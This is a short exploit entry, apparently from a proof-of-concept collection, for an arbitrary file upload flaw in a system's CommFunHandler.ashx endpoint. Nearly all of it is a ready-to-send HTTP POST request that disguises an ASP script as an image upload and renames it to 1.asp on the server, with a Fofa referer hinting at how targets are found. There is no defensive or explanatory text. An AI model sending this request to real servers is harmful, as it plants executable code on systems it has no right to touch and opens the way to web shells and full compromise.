# zckx_CommFunHandler_fileupload

from: https://mp.weixin.qq.com/s/lLbWlodFfxpnbq8-XSWNdA
@2 2024.3.11

```
POST /SystemManager/Comm/CommFunHandler.ashx HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://fofa.info/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=zaiwm34v0gxjfsfcjx3zvw5u
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
Content-Length: 864


----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: image/jpeg

<%
Response.Write("this is test")
%>


----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"

1.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"

UploadZoneImg
----------------------------354575237365372692397370
Content-Disposition: form-data; name="solutionNo"

----------------------------354575237365372692397370
Content-Disposition: form-data; name="siteNo"

1
----------------------------354575237365372692397370
Content-Disposition: form-data; name="showNo"

1
----------------------------354575237365372692397370
Content-Disposition: form-data; name="showingNo"

1
----------------------------354575237365372692397370--
```
